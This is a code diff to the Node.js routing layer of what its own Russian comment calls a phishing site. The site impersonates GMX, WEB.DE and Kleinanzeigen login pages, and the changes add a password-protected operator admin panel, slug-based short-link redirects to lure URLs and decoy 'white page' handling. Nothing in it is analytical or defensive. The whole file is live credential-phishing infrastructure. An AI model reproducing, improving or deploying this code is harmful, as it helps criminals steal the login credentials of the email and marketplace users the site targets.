@@ -341,6 +341,10 @@ function runHostShortCanonicalPhase(req, res, o) {
     ADMIN_DOMAIN,
     isAdminRequest,
     isAdminDomainAllowedPath,
+    isAdminDomainPublicUnauthenticatedPath,
+    buildAdminLoginNextUrl,
+    PASSWORD_AUTH_ENABLED,
+    hasValidAdminSession,
     isShortDomain,
     shortDomainKey,
     shortDomainsList,
@@ -372,27 +376,44 @@ function runHostShortCanonicalPhase(req, res, o) {
     } else if (nhRequest === nhAdmin) {
       /** Если ADMIN_DOMAIN совпал с каноническим доменом фишинга (ошибка .env) — не резать /anmelden и пр. */
       const adminHostIsAlsoVictimSite = nhAdmin === nhCanon && nhCanon.length > 0;
-      if (!adminHostIsAlsoVictimSite && !isAdminDomainAllowedPath(pathname)) {
-        if (safeEnd(res)) return true;
-        res.writeHead(404, { 'Content-Type': 'text/plain' });
-        res.end('Not Found');
-        return true;
+      if (!adminHostIsAlsoVictimSite) {
+        const pwdAuth = !!PASSWORD_AUTH_ENABLED;
+        const hasSess = typeof hasValidAdminSession === 'function' && hasValidAdminSession(req);
+        if (pwdAuth) {
+          if (!hasSess) {
+            if (!isAdminDomainPublicUnauthenticatedPath(pathname, req.method)) {
+              if (safeEnd(res)) return true;
+              const next = typeof buildAdminLoginNextUrl === 'function' ? buildAdminLoginNextUrl(req) : '/admin';
+              res.writeHead(302, {
+                Location: '/admin-login?next=' + encodeURIComponent(next),
+                'Cache-Control': 'no-store'
+              });
+              res.end();
+              return true;
+            }
+          } else if (!isAdminDomainAllowedPath(pathname)) {
+            if (pathname === '/' || pathname === '') {
+              if (safeEnd(res)) return true;
+              res.writeHead(302, { Location: '/admin', 'Cache-Control': 'no-store' });
+              res.end();
+              return true;
+            }
+            if (safeEnd(res)) return true;
+            res.writeHead(404, { 'Content-Type': 'text/plain' });
+            res.end('Not Found');
+            return true;
+          }
+        } else if (!isAdminDomainAllowedPath(pathname)) {
+          if (safeEnd(res)) return true;
+          res.writeHead(404, { 'Content-Type': 'text/plain' });
+          res.end('Not Found');
+          return true;
+        }
       }
     }
   }
 
-  const aliasesGmx = GMX_DOMAINS_LIST || [];
-  const aliasesWebde = WEBDE_DOMAINS_LIST || [];
-  const aliasesKlein = KLEIN_DOMAINS_LIST || [];
-  const brandEarly = getBrand(req);
-  let domainAliases = [];
-  if (brandEarly.id === 'gmx') domainAliases = aliasesGmx;
-  else if (brandEarly.id === 'webde') domainAliases = aliasesWebde;
-  else if (brandEarly.id === 'klein') domainAliases = aliasesKlein;
-  const isCanonicalHost =
-    nhRequest === nhCanon
-    || (domainAliases.length > 0
-      && domainAliases.some(function (d) { return nhRequest === normHost(d); }));
+  const isCanonicalHost = nhRequest === nhCanon;
   if (!isLocalhost && requestHost && !isCanonicalHost && nhRequest !== nhAdmin && !isShortDomain) {
     if (safeEnd(res)) return true;
     res.writeHead(301, { Location: 'https://' + canonicalDomain + (req.url || '/') });
@@ -401,7 +422,24 @@ function runHostShortCanonicalPhase(req, res, o) {
   }
 
   if (isShortDomain && (req.method === 'GET' || req.method === 'HEAD')) {
-    const targetUrl = (shortDomainsList[shortDomainKey].targetUrl || '').trim();
+    const shortEntry = shortDomainsList[shortDomainKey];
+    const pathLinks = shortEntry && shortEntry.pathLinks && typeof shortEntry.pathLinks === 'object' ? shortEntry.pathLinks : null;
+    if (pathLinks) {
+      const norm = (pathname || '/').replace(/\/+$/, '') || '/';
+      const m = norm.match(/^\/([a-zA-Z0-9_-]{3,64})$/);
+      if (m) {
+        const slug = m[1];
+        const pl = pathLinks[slug];
+        const dest = pl && pl.url ? String(pl.url).trim() : '';
+        if (dest && /^https?:\/\//i.test(dest)) {
+          if (safeEnd(res)) return true;
+          res.writeHead(302, { Location: dest, 'Cache-Control': 'no-store' });
+          res.end();
+          return true;
+        }
+      }
+    }
+    const targetUrl = (shortEntry.targetUrl || '').trim();
     const targetIsAnmelden = !targetUrl || targetUrl === 'anmelden' || targetUrl === '/anmelden';
     const redirectTo = targetUrl || ('https://' + GMX_DOMAIN + '/');
     const host = requestHost;
@@ -418,7 +456,7 @@ function runHostShortCanonicalPhase(req, res, o) {
         if (brand.id === 'klein') {
           indexFile = path.join(PROJECT_ROOT, 'klein', 'index.html');
         } else {
-          const useWebde = shortDomainsList[shortDomainKey].whitePageStyle === 'news-webde';
+          const useWebde = shortEntry.whitePageStyle === 'news-webde';
           indexFile = path.join(PROJECT_ROOT, useWebde ? 'webde' : 'gmx', 'index.html');
         }
         serveFile(indexFile, res, req, getBrand);
